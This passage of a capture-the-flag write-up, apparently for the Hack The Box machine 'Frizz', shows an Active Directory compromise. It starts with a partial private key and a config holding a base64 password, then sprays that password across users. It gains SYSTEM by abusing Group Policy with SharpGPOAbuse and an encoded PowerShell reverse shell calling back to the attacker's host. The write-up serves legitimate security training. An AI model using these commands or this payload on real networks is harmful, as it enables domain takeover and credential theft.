kQoOX55hlKEMbNGAASD5gPD9rTTIofLFD7GFhkS+2P7DbP5VVZFx65WFEsY+Wb9b
byPVcuKZC38VCjhABsZSAOwIna3lLwZDPnDF83Wuna5ut30R8Jo0dCLLQ6SM/tS+
gwQKrWqLozl1OTQzb+SsceUPRaRF+vJkc+LMWRJ9DA4JbPBVBwZmPsS9c23lI/bS
R70JPkCmK8qW7eswARqzYRy48ADPNyvF962gMmCLbBG/OppbeaNmvvEj1dnPkgP8
y3uZcK4pHXgtS5YYsYHlrEogyP7oaupISAFyZQIDAQABAoIBACUMmJfH/Y4LKyz/
V4rE4Ixys4RIUmE4h7nmwUSAxvXXT357XHUxjdKTwgOqWGOkY4lXD2C2/Slm/5vf
J1hUTdf5Dp3fou7x74nHUUtM6UvySOhX5gl2QaznB9ON9E07NLhq9GvdcK3Qeh17
7py1r137qemtWiP4x297RVGbUI4pcoys4C6haElAxafrR9cbXeR2+PZqWU7BlmBq
Rc21bgf7sbeAbXoSVlK/+Zm51sHP8iGgXbSrM/aNVb0jkcEVVs24J7svUnF/rPvq
z9+VzKJisjhPQBGAodKGz1W/dfYHv1lzgrVjil7AQkrf4J8DKfrgzWgDiGIskNN2
McYNX0ECgYEA7uZIcl8pBOHOF+57gkbW7UP4pAHDnr59fFg4EVghzJlqtT5EfQUW
WHkLAla0dAxGOLdUPK+NRLaG80cxrM0RyDgP/B0s5sNUgKavMVyZAEfwZBo7H+cA
n6CIXYHXrwvwwlDiO5Gojp3PsWnKQ/FmblQpw0vwWvC9N0tiJG5AIhUCgYEAw8sU
PyCH4W5uBwFCkUBSba91panqsksbg/79eZQ+/a3wEKMxEuq8LW0D9L1J+SfW+j13
lKFvYnsaCGCwvwqUBLp6oaATY7y1Rk7Ws6bbcdoTmPBfWfE0nEpdti47RS2C2UHF
MByYlJ0mEjxL9qp2sTPai+Od+qwklXqN1nFhMxECgYAqStY0eSg31wm3Lt7ql0Ph
SRExZ6aL6ckpRCzY1TNWlypO37EcONRV4UfTqCnWCX48+CePfryRl4aYdtgScVNe
kJ4z0a5rQ9Un2VpWcMAdTp79+a7R3QE9QRwjAaN/N6vtmogSZ5zhcoqcK9BE6u1p
RrkF++GXF9tHeK7tKB9uaQKBgQCyDamA6wWHJdTbe/LcguEzLIBRwp9Tuufv9uDu
QrmyGw8ZIj9Lk7rDmMMjO0zdT7S551IrEVBo/8gh3ER/x4/qaOeCuj9H0WIM6T9p
KxGfjRGLYPVlpuwQQbTNK2ftNkErcBtx8F91rx/jL4BpdoXwClbyJnIRd6Dhaw03
+e3J8QKBgQDJyl2HqkF+nmz14xTXKWsMRoSuAYdSk3K+KcH1AKMe+NHgrlBHGeIZ
5nD/I0RyJTOHWJjRUP4cUhM+HRf3RJDmOnR0lyOIdZ8tSFw06kma0eIYrpO0Q7cJ
xXbJzR4RErWo1giVY/GcsdCKUiDKy5FAXsncb3wAaU29PcLCUrP5kA==
-----END RSA PRIVATE KEY-----

❯ ccat waptserver.ini      
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log

❯ echo "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d          
!suBcig@MehTed!R
```
- The password `!suBcig@MehTed!R` might be used for one of the many users we discovered

```sh
❯ nxc smb 10.129.14.231 -u users.txt -p '!suBcig@MehTed!R' -k                    
SMB         10.129.14.231   445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\f.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED 
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\w.li:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED 
SMB         10.129.14.231   445    frizzdc          [-] frizz.htb\h.arm:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED 
SMB         10.129.14.231   445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R 
```
- Looks like the creds `M.SchoolBus:!suBcig@MehTed!R` work!

# User Shell - M.SchoolBus
## SSH - M.SchoolBus
---
- We can perform `kinit` with our newfound credentials to add the ticket for `M.SchoolBus` to our system:
```sh
❯ kinit M.SchoolBus                                                              
Password for M.SchoolBus@FRIZZ.HTB:

❯ ssh M.SchoolBus@10.129.14.231 -k
PowerShell 7.4.5
PS C:\Users\M.SchoolBus>
```

## Enumeration
---
- We can perform `whoami /all` to see if anything interesting stands out:
```powershell
PS C:\Users\M.SchoolBus> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
frizz\m.schoolbus S-1-5-21-2386970044-1145388522-2932701813-1106


GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
- The `Group Policy Creator Owners` group is interesting because it implies that `M.SchoolBus` is able to read and write Group Policy Objects

## GPO
---
- [Group Policy Objects](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects) (GPOs) are collections of policy settings that apply to various computers, users, and groups across an Active Directory domain

- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is a project for attacking GPOs with capabilities to modify users, add local admins, set startup scripts, run commands, etc.

## SharpGPOAbuse
---
- We can grab a pre-compiled binary from the [SharpCollection Github Repo](https://github.com/Flangvik/SharpCollection/tree/master)
- First we need to figure out which `.NET` versions are on the target system:
```powershell
PS C:\Users\M.SchoolBus> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
```
- We could also look at the directories in `\Windows\Microsoft.NET\Framework`:
```powershell
PS C:\Users\M.SchoolBus> ls C:\Windows\Microsoft.NET\Framework\

    Directory: C:\Windows\Microsoft.NET\Framework

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----            5/8/2021  1:27 AM                v1.0.3705
d----            5/8/2021  1:27 AM                v1.1.4322
d----            5/8/2021  1:15 AM                v2.0.50727
d----            2/6/2026  8:38 PM                v4.0.30319
...
```

- Now we'll grab the [.NET 4.0 SharpGPOAbuse x64 binary](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_x64/SharpGPOAbuse.exe) and `scp` it over to the target box
```sh
❯ scp SharpGPOAbuse.exe m.schoolbus@10.129.14.231:~/
SharpGPOAbuse.exe                                                     100%   69KB   1.5MB/s   00:00    
```

- `SharpGPOAbuse` requires a vulnerable (writable) GPO. We can fetch the GPOs on the domain with the following:
```powershell
PS C:\Users\M.SchoolBus> Get-GPO -all

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 6:25:44 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

DisplayName      : Default Domain Controllers Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 6:19:24 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
```

- Rather than mess with these, it'll be cleaner to create our own:
```powershell
PS C:\Users\M.SchoolBus> New-GPO -name "wallfly"

DisplayName      : wallfly
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : d8bc6130-219d-43d6-8d82-444a3e960e1c
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 2/7/2026 12:25:57 AM
ModificationTime : 2/7/2026 12:25:57 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
```
- Now we need to link the GPO to the computer to populate its GUID
```powershell
PS C:\Users\M.SchoolBus> New-GPLink -Name "wallfly" -target "DC=frizz,DC=htb"

GpoId       : a172874f-2733-4da6-b705-4d90f06baeb8
DisplayName : wallfly
Enabled     : True
Enforced    : False
Target      : DC=frizz,DC=htb
Order       : 2
```
- Now we can use `SharpGPOAbuse` to run a basic `Powershell whoami` command and output the result to a text file:
```powershell
PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --addcomputertask --GPOName "wallfly" --Author "wallfly" --TaskName "test" --Command "powershell.exe" --Arguments "whoami > \users\m.schoolbus\test"
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "wallfly" is: {A172874F-2733-4DA6-B705-4D90F06BAEB8}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{A172874F-2733-4DA6-B705-4D90F06BAEB8}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```
- The file hasn't shown up, so we need to propagate the new `GPO` with `gpupdate`:
```powershell
PS C:\Users\M.SchoolBus> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

PS C:\Users\M.SchoolBus> cat test
nt authority\system
```
- Looks like we've got RCE as root!

# Root Shell
## SharpGPOAbuse Reverse Shell
---
- There's a cleanup script running on the box that removes our GPO's, and theres a method to update them as well, but its simplest to just create a new policy for our reverse shell
```powershell
PS C:\Users\M.SchoolBus> New-GPO -name "revshell"                                                                                                                                                               
DisplayName      : revshell
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 1eb5b8a9-0b9d-48c7-9725-743ecc3e6e57
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 2/7/2026 12:39:12 AM
ModificationTime : 2/7/2026 12:39:12 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

PS C:\Users\M.SchoolBus> New-GPLink -Name "revshell" -target "DC=frizz,DC=htb"                                                                                                                                  
GpoId       : 1eb5b8a9-0b9d-48c7-9725-743ecc3e6e57
DisplayName : revshell
Enabled     : True
Enforced    : False
Target      : DC=frizz,DC=htb
Order       : 2

PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --addcomputertask --GPOName "revshell" --Author "wallfly" --TaskName "revshell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADEAIgAsADEAMgAzADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "revshell" is: {53DF7901-A21F-4385-8754-70FB3CDF528B}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{53DF7901-A21F-4385-8754-70FB3CDF528B}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!

PS C:\Users\M.SchoolBus> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```
```sh
❯ nc -lvnp 12345                                             
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.14.231.
Ncat: Connection from 10.129.14.231:58727.
whoami
nt authority\system
```
- And we've got it!!

```powershell
PS C:\Users\Administrator\Desktop> type root.txt
1592f9f35ae113ecce229b4701ba6153
```